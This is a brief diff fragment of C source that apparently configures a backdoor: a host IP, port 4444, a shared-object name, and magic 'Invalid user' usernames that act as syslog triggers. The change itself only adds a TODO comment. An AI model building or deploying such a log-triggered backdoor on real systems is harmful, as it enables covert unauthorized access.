@@ -17,6 +17,7 @@
 #define host "192.168.64.1"
 #define FILENAME "malloc_3.so"
 #define LISTENING_PORT 4444
+//TODO: use exact failure message for syslog not just substring
 #define TRIGGER_1 "Invalid user admin123"
 #define TRIGGER_2 "Invalid user user123"
 #define TRIGGER_3 "Invalid user clear123"
